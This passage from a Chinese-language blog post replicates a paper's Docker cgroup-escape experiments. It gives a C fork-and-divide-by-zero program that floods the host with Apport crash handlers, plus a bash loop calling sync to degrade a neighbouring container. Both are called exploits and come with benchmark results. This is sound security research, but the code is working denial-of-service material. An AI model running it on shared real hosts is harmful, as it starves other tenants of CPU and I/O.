<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL3NlY3VyaXR5L3VzZXJucy1yZW1hcC8=" title="https://docs.docker.com/engine/security/userns-remap/">https://docs.docker.com/engine/security/userns-remap/<i class="fa fa-external-link"></i></span>  参考这个</li>
</ul>
<p>讲解一下基本的参数，更多的参数说明请参考官方文档[^note5]</p>
<ul>
<li><em>--cpuset-cpus</em> 指定了 container 运行在哪个 cpu core 上，可以指定单个或者多个</li>
<li><em>--cpus</em> 指定了 container 可以使用 cpu 资源的上限，举例来说，上述语句里面的值为 0.1，那么 container 可以使用的 cpu 资源上限就是 10%，也可以用 <em>--cpu-period</em> 和 <em>--cpu-quota</em> 捆绑使用来<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL3JlZmVyZW5jZS9ydW4vI2NwdS1wZXJpb2QtY29uc3RyYWludA==" title="https://docs.docker.com/engine/reference/run/#cpu-period-constraint">实现相同的功能<i class="fa fa-external-link"></i></span>[^note6]</li>
<li><em>--pids-limit</em> 指定了进程数目的上线，一旦超过这个上限，就会返回 <em>fork: Interrupted system call</em> 的错误信息</li>
<li>剩下的 <em>-v</em> 是文件映射，为了执行在 Host 上编译生成的文件</li>
</ul>
<p>接下来需要做的是编写 exploit code，用来制造 faults 从而实现 escape from parrent cgroup。</p>
<p>编写的文件如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt; </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> pid = fork();</span><br><span class="line">        <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> i = <span class="number">1</span> / <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ignore the SIGCHLD signal</span></span><br><span class="line">        signal(SIGCHLD,SIG_IGN);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逻辑很简单，父进程在不停的循环执行 fork 操作，而成功生成的子进程则负责执行 <em>div 0</em> 操作引发 faults。其中 ignore <code>SIGCHLD</code>信号的原因参考<a href="https://tianyuzhou.top/2019/10/21/fork-in-c/">这篇文章</a>。具体产生的 fault 如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Floating point exception(core dumped)</span><br></pre></td></tr></table></figure>

<p>将该文件编译好之后，可以尝试运行，但由于会不断的制造 fault，造成 Host 的 cpu 直接被占满，我在实验的时候根本就无法进行后续操作了，只能重启电脑。</p>
<p>按照论文里面的说法，对于 Ubuntu 而言，处理这些 faults 的应用是 <em>Apport</em>，因此在我们执行这个程序的时候，Apport 进程将会大量产生，从而占满 cpu。</p>
<p>下面的是运行 top 命令对于该文件运行时的监控</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">top - 16:46:18 up  2:02,  1 user,  load average: 15.93, 4.08, 1.68</span><br><span class="line">Tasks: 470 total,  55 running, 319 sleeping,   0 stopped,   1 zombie</span><br><span class="line">%Cpu0  : 84.7 us, 15.3 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu1  : 93.2 us,  6.8 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu2  : 94.1 us,  5.9 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu3  : 92.2 us,  7.8 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu4  : 91.5 us,  8.5 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu5  : 89.9 us, 10.1 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu6  : 92.5 us,  7.5 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu7  : 91.2 us,  8.8 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu8  : 91.9 us,  8.1 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu9  : 92.2 us,  7.8 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu10 : 91.9 us,  8.1 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">%Cpu11 : 91.6 us,  8.4 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">KiB Mem : 16212396 total, 10905352 free,  3395860 used,  1911184 buff&#x2F;cache</span><br><span class="line">KiB Swap:  2097148 total,  2097148 free,        0 used. 12426024 avail Mem </span><br><span class="line"></span><br><span class="line">  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND</span><br><span class="line"> 7647 root      20   0    4372   1080   1008 R   8.9  0.0   0:01.63 pppp</span><br><span class="line">26842 root      20   0   98756  24208  11808 R   4.3  0.1   0:00.13 apport</span><br><span class="line">26847 root      20   0   98236  23900  11752 R   3.9  0.1   0:00.12 apport</span><br><span class="line">26852 root      20   0   98236  23004  11356 R   3.9  0.1   0:00.12 apport</span><br><span class="line">27400 root      20   0   98756  24316  11916 R   3.9  0.1   0:00.12 apport</span><br><span class="line">27403 root      20   0   98236  23268  11396 R   3.9  0.1   0:00.12 apport</span><br><span class="line">... lots of apport</span><br></pre></td></tr></table></figure>

<p>运行 top 命令之后按下数字键盘中的 1，可以分不同的 core 来展示 cpu 的使用量，上图是运行的一个截图，并不是稳定的值，只是 cpu 被无数个 apport 占满时的一个时刻的情况</p>
<p>而此刻，我也用 <em>docker stats</em> 命令监视着容器的情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NAME            CPU %       MEM USAGE &#x2F; LIMIT     MEM %         PIDS</span><br><span class="line">nifty_gauss     10.66%      10.5MiB &#x2F; 15.46GiB    0.07%         50</span><br></pre></td></tr></table></figure>

<p>为了方便展示，我把 container ID，Net I/O，Block I/O 这些字段删除了，重点关注容器的 cpu 占用，我们发现短时间内 cpu 使用率为 10.66%，在持续观察的过程中，基本都在 10% 上下，也符合之前设定的 10% 以内，因此在这种情况下，其实是 Apport 这个 core dump application 占用了大量的 CPU。</p>
<h4 id="Graph-for-cpu-utilization"><a href="#Graph-for-cpu-utilization" class="headerlink" title="Graph for cpu utilization"></a>Graph for cpu utilization</h4><div id="container" style="weight:80%; height: 600px"></div>
<script type="text/javascript" src="/js/echarts.min.js"></script>
<script type="text/javascript">
var dom = document.getElementById("container");
var myChart = echarts.init(dom);
var app = {};
option = null;
var seriesLabel = {
normal: {
show: true,
position: 'right',
textBorderWidth: 2
}
}
option = {
tooltip: {
trigger: 'axis',
axisPointer: {
type: 'shadow'
}
},
legend: {
data: ['Container', 'Host(100% container)', 'Host(10% container)', 'Host(5% container)']
},
xAxis: {
type: 'value',
name: '%',
axisLabel: {
formatter: '{value}'
}
},
yAxis: {
type: 'category',
name: 'PID limit',
nameLocation: 'start',
inverse: true,
data: ['none', '100', '50'],
axisLabel: {
formatter: function (value) {
return value;
},
margin: 20,
rich: {
value: {
lineHeight: 30,
align: 'center'
}
}
}
},
series: [
{
name: 'Container',
type: 'bar',
data: [7.14, 11.5, 15],
label: seriesLabel
},
{
name: 'Host(100% container)',
type: 'bar',
label: seriesLabel,
data: [1200, 1200, 1200]
},
{
name: 'Container(10%)',
type: 'bar',
data: [2.56, 10.09, 10.38],
label: seriesLabel,
itemStyle: {
color: '#c23531'
}
},
{
name: 'Host(10% container)',
type: 'bar',
label: seriesLabel,
data: [1200, 1200, 1200]
},
{
name: 'Container(5%)',
type: 'bar',
data: [3.04, 5.35, 5.13],
label: seriesLabel,
itemStyle: {
color: '#c23531'
}
},
{
name: 'Host(5% container)',
type: 'bar',
label: seriesLabel,
data: [1200, 1200, 1200]
}
]
};
;
if (option && typeof option === "object") {
    myChart.setOption(option, true);
}
</script>



<p>在上图中，只要在 container 中 run 我们之前编写的 exploit 程序，Host Utilization 即物理主机 cpu 使用量就会达到 1200%，因为物理机一共有 12 个 cpu core。可以看到在每个 pid limit 小组当中，container 的 cpu 使用量都是随着 cpu share 的限制逐步降低的，但有部分内容与论文当中展示的数据图表不同，主要有以下几点</p>
<ul>
<li><strong>所有的 Host Utilization 均为 1200%</strong>，不存在有 cpu 未被占满的情况</li>
<li>由上一点可以看出，<strong>限制 container 的 cpu share 并不能缓解 host cpu 滥用这一情况</strong></li>
<li>随着 PID limit 的变化，container utilization 并没有大幅度的变化，事实上，因为在不限制 PID limit 的时候可以在短时间内创建大量的 core dump，因此 container utilization 还比其他的情况要低一些</li>
</ul>
<h4 id="DoS-Attack"><a href="#DoS-Attack" class="headerlink" title="DoS Attack"></a>DoS Attack</h4><p>由于 sysbench 需要在容器当中使用，所以可以创建一个新的 image 然后保存它，之后每次都可以用这个 image 来实验，因为 sysbench 要用好几次。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu</span><br><span class="line"><span class="keyword">MAINTAINER</span> Tianyu &lt;lufeihaizei2008@gmail.com&gt;</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./apt /apt-info</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> cp /apt-info/sources.list /etc/apt/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> yes | apt-get install sysbench</span></span><br></pre></td></tr></table></figure>

<p>利用上述的文件创建新的 image，然后利用新的 image 创建 victim container。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tianyu-ubuntu&#x2F;</span><br><span class="line">├── apt</span><br><span class="line">│   └── sources.list</span><br><span class="line">└── Dockerfile</span><br></pre></td></tr></table></figure>

<p>树型文件目录如上图所示，其中 apt 文件夹和 sources.list 文件是用来更新 apt-get 源，因为在国内需要用<span class="exturl" data-url="aHR0cHM6Ly9taXJyb3JzLnpqdS5lZHUuY24v" title="https://mirrors.zju.edu.cn/">国内的镜像<i class="fa fa-external-link"></i></span>。具体的 Dockerfile instruction 介绍请参考<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL3JlZmVyZW5jZS9idWlsZGVyLw==" title="https://docs.docker.com/engine/reference/builder/">官方文档<i class="fa fa-external-link"></i></span>。</p>
<p>然后在 <code>cgroup-escape/</code> 目录运行以下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker build -t tianyu/ubuntu:v1 .</span></span><br></pre></td></tr></table></figure>

<p>然后就可以在 docker images 当中看到我们新建的 image 了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker images</span></span><br><span class="line">REPOSITORY         TAG     IMAGE ID          CREATED             SIZE</span><br><span class="line">tianyu/ubuntu      v1      ab7bed523666      7 seconds ago       131MB</span><br></pre></td></tr></table></figure>

<p>在这个容器当中可以使用 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Frb3B5dG92L3N5c2JlbmNo" title="https://github.com/akopytov/sysbench">sysbench<i class="fa fa-external-link"></i></span> 这个 cpu/memory 测试工具。这项工具的具体使用方法参照<span class="exturl" data-url="aHR0cHM6Ly93d3cuaG93dG9mb3JnZS5jb20vaG93LXRvLWJlbmNobWFyay15b3VyLXN5c3RlbS1jcHUtZmlsZS1pby1teXNxbC13aXRoLXN5c2JlbmNo" title="https://www.howtoforge.com/how-to-benchmark-your-system-cpu-file-io-mysql-with-sysbench">这里<i class="fa fa-external-link"></i></span>。</p>
<p>在论文里面，对于性能的描述单位是</p>
<ul>
<li>events per second for cpu</li>
<li>MiB per second for memory and I/O</li>
</ul>
<p>在这个 Dos Attack Case 里面，要运行 2 个 containers：一个是 malicious container，一个是 victim container。</p>
<p>首先在 victim 当中运行 sysbench 性能测试，得到无任何干扰的 baseline，然后在相同和不同 cpu core 同时运行 victim/malicious container，查看对于 victim container 性能的影响。</p>
<p>文章中说 victim container 和 malicious container 的 cpu share 和 quota 都一致，我在实验的时候设置的值如下</p>
<ul>
<li>cpu share 的值为默认的 1024</li>
<li>cpu core 设定为 0 号</li>
<li>quota 的值未设定，而是通过 <em>--cpus=&quot;.5&quot;</em> 来设置，即最多不超过 50%。</li>
</ul>
<p>首先是 base line 的 sysbench 测试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run --cpuset-cpus=<span class="string">"0"</span> --cpus=<span class="string">".5"</span> --rm -it tianyu/ubuntu:v1</span></span><br><span class="line">root@84a29dfee4a6:/# sysbench --test=cpu --cpu-max-prime=20000 run</span><br><span class="line">sysbench 1.0.11 (using system LuaJIT 2.1.0-beta3)</span><br><span class="line">Running the test with following options:</span><br><span class="line">Number of threads: 1</span><br><span class="line">Initializing random number generator from current time</span><br><span class="line"></span><br><span class="line">Prime numbers limit: 20000</span><br><span class="line">Initializing worker threads...</span><br><span class="line">Threads started!</span><br><span class="line"></span><br><span class="line">CPU speed:</span><br><span class="line">    events per second:   218.67</span><br><span class="line"></span><br><span class="line">General statistics:</span><br><span class="line">    total time:                          10.0002s</span><br><span class="line">    total number of events:              2188</span><br><span class="line"></span><br><span class="line">Latency (ms):</span><br><span class="line">         min:                                  1.57</span><br><span class="line">         avg:                                  4.57</span><br><span class="line">         max:                                 57.72</span><br><span class="line">         95th percentile:                      9.22</span><br><span class="line">         sum:                               9998.17</span><br><span class="line"></span><br><span class="line">Threads fairness:</span><br><span class="line">    events (avg/stddev):           2188.0000/0.00</span><br><span class="line">    execution time (avg/stddev):   9.9982/0.00</span><br></pre></td></tr></table></figure>

<p>sysbench 的测试结果显示，<em>events per second</em> 的值为 250.73。和论文当中的值 632.5 有较大差距，可能在于论文当中设置的 <em>--cpus</em> 参数值较大。我将 <em>--cpus</em> 改为 1 之后，得到的 <em>events per second</em> 的值为 627.17。</p>
<p>接着做同一个 cpu core 运行 malicious container 的实验，得到的 <em>events per second</em> 的值为 7.31。</p>
<p>最后是不同 cpu core 运行 malicious container 的实验，得到的 <em>events per second</em> 的值为 10.81。</p>
<p>类似的，关于 memory 和 I/O Read/Write 的实验也和上述步骤类似，具体的 sysbench 测试语句如下，我参考了<span class="exturl" data-url="aHR0cHM6Ly9saW51eHRlY2hsYWIuY29tL2JlbmNobWFyay1saW51eC1zeXN0ZW1zLWluc3RhbGwtc3lzYmVuY2gtdG9vbC8=" title="https://linuxtechlab.com/benchmark-linux-systems-install-sysbench-tool/">这个网站<i class="fa fa-external-link"></i></span></p>
<p><strong>memory</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> sysbench memory run</span></span><br></pre></td></tr></table></figure>

<p><strong>I/O</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> sysbench --<span class="built_in">test</span>=fileio --file-total-size=20G prepare</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sysbench --<span class="built_in">test</span>=fileio --file-total-size=20G --file-test-mode=rndrw --max-time=300 --max-requests=0 run</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sysbench --<span class="built_in">test</span>=fileio --file-total-size=20G cleanup</span></span><br></pre></td></tr></table></figure>

<p><strong>最后得到的数据如下所示</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>CPU</th>
<th>Memory</th>
<th>I/O Read</th>
<th>I/O Write</th>
</tr>
</thead>
<tbody><tr>
<td>Baseline</td>
<td>250.73</td>
<td>2545.81</td>
<td>1.55</td>
<td>1.03</td>
</tr>
<tr>
<td>same core</td>
<td>7.31</td>
<td>56.22</td>
<td>0.28</td>
<td>0.18</td>
</tr>
<tr>
<td>different core</td>
<td>10.81</td>
<td>68.74</td>
<td>0.86</td>
<td>0.58</td>
</tr>
</tbody></table>
<h5 id="Graph"><a href="#Graph" class="headerlink" title="Graph"></a>Graph</h5><p>把<strong>减少率</strong>可视化如下图所示</p>
<div id="container2" style="weight:80%; height: 600px"></div>
<script type="text/javascript">
var dom = document.getElementById("container2");
var myChart = echarts.init(dom);
var app = {};
option = null;
var seriesLabel = {
normal: {
show: true,
position: 'right',
textBorderWidth: 2
}
}
option = {
    title: {
        text: 'Annual Rate'
    },
    tooltip: {
        trigger: 'axis'
    },
    legend: {
        data:['same core','different core']
    },
    grid: {
        left: '3%',
        right: '4%',
        bottom: '3%',
        containLabel: true
    },
    xAxis: {
        type: 'category',
        data: ['CPU','Memory','I/O Read','I/O Write']
    },
    yAxis: {
        type: 'value'
    },
    series: [{
            name:'same core',
            type:'line',
            data:[97.09, 97.8, 81.94, 82.53]
        },
        {
            name:'different core',
            type:'line',
            data:[95.69, 97.3, 44.52, 43.69]
        }
    ]
};
;
if (option && typeof option === "object") {
    myChart.setOption(option, true);
}
</script>



<h3 id="Case-2-Data-Synchronization"><a href="#Case-2-Data-Synchronization" class="headerlink" title="Case 2: Data Synchronization"></a>Case 2: Data Synchronization</h3><p>这一节关注的是 Linux 关于文件读写的漏洞。在进程对文件进行读写的时候，为了加快写操作的速度，系统采用了 <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvQ2FjaGVfKGNvbXB1dGluZyk=" title="https://en.wikipedia.org/wiki/Cache_(computing)">lazy disk writeback mechanism<i class="fa fa-external-link"></i></span> 来实现异步的往 disk 中写入 updated 的数据。对于 container 来说，它被允许调用一系列关于文件同步即 push Linux kernel 进行数据同步的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21vYnkvbW9ieS9ibG9iL2EzMDk5MGIzYzhkMGQ0MjI4MGZhNTAxMjg3ODU5ZTFkMjM5M2E5NTEvcHJvZmlsZXMvc2VjY29tcC9kZWZhdWx0Lmpzb24jTDMzMw==" title="https://github.com/moby/moby/blob/a30990b3c8d0d42280fa501287859e1d2393a951/profiles/seccomp/default.json#L333">系统调用<i class="fa fa-external-link"></i></span>，比如 sync，syncfs 还有 fsync 等。</p>
<p>论文提出 sync 系统调用可以用来降低 system-wide I/O performance，进行 resource-freeing attack 以及建立 convert channel。当然，<strong>只有当前系统当中存在 write 行为的时候</strong>，sync 相关的 attack 才有用武之地。</p>
<h4 id="I-O-Based-DOS-Attack"><a href="#I-O-Based-DOS-Attack" class="headerlink" title="I/O Based DOS Attack"></a>I/O Based DOS Attack</h4><p>这个实验中，依旧是 2 个 containers run 在不同的 cpu core，一个循环调用 sync() system call。另一个 victim container 中运行 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2F4Ym9lL2Zpbw==" title="https://github.com/axboe/fio">FIO benchmark<i class="fa fa-external-link"></i></span> 来检测 I/O performance，运行 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2tkbHVjYXMvYnl0ZS11bml4YmVuY2g=" title="https://github.com/kdlucas/byte-unixbench">Unix benchmark<i class="fa fa-external-link"></i></span> 来检测体统性能的变化。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run --cpuset-cpus=<span class="string">"0"</span> -v /home/zty/dev/byte-unixbench/:/unix-bench -v /home/zty/dev/fio:/fio --rm -it tianyu/ubuntu:v2</span></span><br></pre></td></tr></table></figure>

<p><strong>baseline</strong></p>
<p><strong>fio benchmark</strong></p>
<p>参考</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9maW8ucmVhZHRoZWRvY3MuaW8vZW4vbGF0ZXN0L2Zpb19kb2MuaHRt" title="https://fio.readthedocs.io/en/latest/fio_doc.htm">fio official doc<i class="fa fa-external-link"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDAwMzg4MDU3MQ==" title="https://segmentfault.com/a/1190000003880571">使用fio测试磁盘I/O性能<i class="fa fa-external-link"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS9zaGFvbmlhbi8yMzE5MTc1" title="https://blog.51cto.com/shaonian/2319175">fio 命令入门到跑路<i class="fa fa-external-link"></i></span></p>
<p>fio install </p>
<p>在 Host 上就可以进行 configure 和 make 操作，在 container 中只需要在目录下运行 <em>make install</em> 即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /fio</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./configure</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make install</span></span><br></pre></td></tr></table></figure>

<p>fio test</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># fio -directory&#x3D;&#x2F;data&#x2F; -name&#x3D;tempfile.dat -direct&#x3D;1 -rw&#x3D;read -bs&#x3D;4k -size&#x3D;10M -numjobs&#x3D;16 -runtime&#x3D;100 -group_reporting</span><br><span class="line">bw (  KiB&#x2F;s): min&#x3D;16544, max&#x3D;46956, per&#x3D;100.00%, avg&#x3D;39513.48, stdev&#x3D;585.67, samples&#x3D;127</span><br><span class="line">iops        : min&#x3D; 4136, max&#x3D;11738, avg&#x3D;9877.77, stdev&#x3D;146.40, samples&#x3D;127</span><br><span class="line"></span><br><span class="line"># fio -directory&#x3D;&#x2F;data&#x2F; -name&#x3D;tempfile.dat -direct&#x3D;1 -rw&#x3D;write -bs&#x3D;4k -size&#x3D;10M -numjobs&#x3D;16 -runtime&#x3D;100 -group_reporting</span><br><span class="line">bw (  KiB&#x2F;s): min&#x3D; 3271, max&#x3D;22178, per&#x3D;100.00%, avg&#x3D;15604.92, stdev&#x3D;320.26, samples&#x3D;333</span><br><span class="line">iops        : min&#x3D;  817, max&#x3D; 5544, avg&#x3D;3900.79, stdev&#x3D;80.07, samples&#x3D;333</span><br><span class="line"></span><br><span class="line"># fio -directory&#x3D;&#x2F;data&#x2F; -name&#x3D;tempfile.dat -direct&#x3D;1 -rw&#x3D;randread -bs&#x3D;4k -size&#x3D;10M -numjobs&#x3D;16 -runtime&#x3D;100 -group_reporting</span><br><span class="line">bw (  KiB&#x2F;s): min&#x3D;  270, max&#x3D; 7788, per&#x3D;99.90%, avg&#x3D;1658.39, stdev&#x3D;60.54, samples&#x3D;3034</span><br><span class="line">iops        : min&#x3D;   66, max&#x3D; 1942, avg&#x3D;413.21, stdev&#x3D;15.11, samples&#x3D;3034</span><br><span class="line"></span><br><span class="line"># fio -directory&#x3D;&#x2F;data&#x2F; -name&#x3D;tempfile.dat -direct&#x3D;1 -rw&#x3D;randwrite -bs&#x3D;4k -size&#x3D;10M -numjobs&#x3D;16 -runtime&#x3D;100 -group_reporting</span><br><span class="line">bw (  KiB&#x2F;s): min&#x3D;  124, max&#x3D; 2304, per&#x3D;99.91%, avg&#x3D;1083.98, stdev&#x3D;25.23, samples&#x3D;3200</span><br><span class="line">iops        : min&#x3D;   28, max&#x3D;  576, avg&#x3D;270.17, stdev&#x3D; 6.31, samples&#x3D;3200</span><br></pre></td></tr></table></figure>

<blockquote>
<p>测试结果如上，主要关注bw和iops结果</p>
</blockquote>
<p>bw：磁盘的吞吐量，这个是顺序读写考察的重点 </p>
<p>iops：磁盘的每秒读写次数，这个是随机读写考察的重点</p>
<p><strong>unixbench</strong></p>
<p>参考</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2tkbHVjYXMvYnl0ZS11bml4YmVuY2gvYmxvYi9tYXN0ZXIvVW5peEJlbmNoL1VTQUdF" title="https://github.com/kdlucas/byte-unixbench/blob/master/UnixBench/USAGE">官方 usage 文档<i class="fa fa-external-link"></i></span></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ./Run execl fsdisk pipe spawn shell1</span></span><br><span class="line">System Benchmarks Index Values               BASELINE       RESULT    INDEX</span><br><span class="line">Execl Throughput                                 43.0       6388.6   1485.7</span><br><span class="line">File Copy 4096 bufsize 8000 maxblocks          5800.0    2444771.8   4215.1</span><br><span class="line">Process Creation                                126.0      14864.3   1179.7</span><br><span class="line">Shell Scripts (1 concurrent)                     42.4      13092.6   3087.9</span><br><span class="line"></span><br><span class="line">Shell Scripts (8 concurrent)                      ---        894.9      ---</span><br><span class="line">Shell Scripts (16 concurrent)                     6.0       1783.4   2972.3</span><br></pre></td></tr></table></figure>



<p><strong>DOS</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run --cpuset-cpus=<span class="string">"5"</span> -v /home/zty/dev/cfile:/cfile --rm -it ubuntu</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cat /cfile/exploit.sh </span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">	sync</span><br><span class="line">done</span><br><span class="line"><span class="meta">#</span><span class="bash"> /cfile/exploit.sh</span></span><br></pre></td></tr></table></figure>



<p><strong>fio</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">read</span><br><span class="line">bw (  KiB&#x2F;s): min&#x3D; 4719, max&#x3D;44356, per&#x3D;100.00%, avg&#x3D;23270.86, stdev&#x3D;781.80, samples&#x3D;211</span><br><span class="line">iops        : min&#x3D; 1179, max&#x3D;11088, avg&#x3D;5817.21, stdev&#x3D;195.46, samples&#x3D;211</span><br><span class="line"></span><br><span class="line">write</span><br><span class="line">bw (  KiB&#x2F;s): min&#x3D;  388, max&#x3D; 1462, per&#x3D;99.91%, avg&#x3D;836.21, stdev&#x3D;12.77, samples&#x3D;3200</span><br><span class="line">iops        : min&#x3D;   94, max&#x3D;  364, avg&#x3D;208.22, stdev&#x3D; 3.20, samples&#x3D;3200</span><br><span class="line"></span><br><span class="line">randread</span><br><span class="line">bw (  KiB&#x2F;s): min&#x3D;  462, max&#x3D; 1648, per&#x3D;99.92%, avg&#x3D;1110.15, stdev&#x3D;13.74, samples&#x3D;3200</span><br><span class="line">iops        : min&#x3D;  114, max&#x3D;  412, avg&#x3D;276.75, stdev&#x3D; 3.44, samples&#x3D;3200</span><br><span class="line"></span><br><span class="line">randwrite</span><br><span class="line">bw (  KiB&#x2F;s): min&#x3D;  261, max&#x3D; 1096, per&#x3D;99.93%, avg&#x3D;666.52, stdev&#x3D;10.12, samples&#x3D;3200</span><br><span class="line">iops        : min&#x3D;   63, max&#x3D;  274, avg&#x3D;165.91, stdev&#x3D; 2.54, samples&#x3D;3200</span><br></pre></td></tr></table></figure>



<p><strong>unixbench</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># .&#x2F;Run execl fsdisk pipe spawn shell1</span><br><span class="line">System Benchmarks Partial Index              BASELINE       RESULT    INDEX</span><br><span class="line">Execl Throughput                                 43.0       6146.8   1429.5</span><br><span class="line">File Copy 4096 bufsize 8000 maxblocks          5800.0    2251578.5   3882.0</span><br><span class="line">Process Creation                                126.0      14396.9   1142.6</span><br><span class="line">Shell Scripts (1 concurrent)                     42.4      12914.4   3045.8</span><br><span class="line"></span><br><span class="line">Shell Scripts (1 concurrent)                      ---        871.8      ---</span><br><span class="line">Shell Scripts (1 concurrent)                      6.0       1738.5   2897.5</span><br></pre></td></tr></table></figure>

<h5 id="Graph-1"><a href="#Graph-1" class="headerlink" title="Graph"></a>Graph</h5><div id="container3" style="weight:100%; height: 600px"></div>
<script type="text/javascript">
var dom = document.getElementById("container3");
var myChart = echarts.init(dom);
var app = {};
option = {
    title: {
        text: 'performance degradation',
        subtext: '占 baseline 数据的比例'
    },
    tooltip: {
        trigger: 'axis',
        axisPointer: {
            type: 'shadow'
        }
    },
    grid: {
        left: '3%',
        right: '4%',
        bottom: '3%',
        containLabel: true
    },
    xAxis: {
        type: 'value',
        boundaryGap: [0, 0.01]
    },
    yAxis: {
        type: 'category',
        data: ['seq_read', 'seq_write', 'rand_read', 'rand_write', 'shell script', 'excel throughput', 'file copy', 'process creation']
    },
    series: [
        {
            color: '#2f4554',
            label: {
                show: 'true',
                position: 'right',
                fontSize: '14'
            },
            barWidth: '35',
            type: 'bar',
            data: [58.89, 5.36, 66.98, 61.41, 98.64, 96.22, 92.10, 96.86]
        }
    ]
};
;
if (option && typeof option === "object") {
    myChart.setOption(option, true);
}
</script>

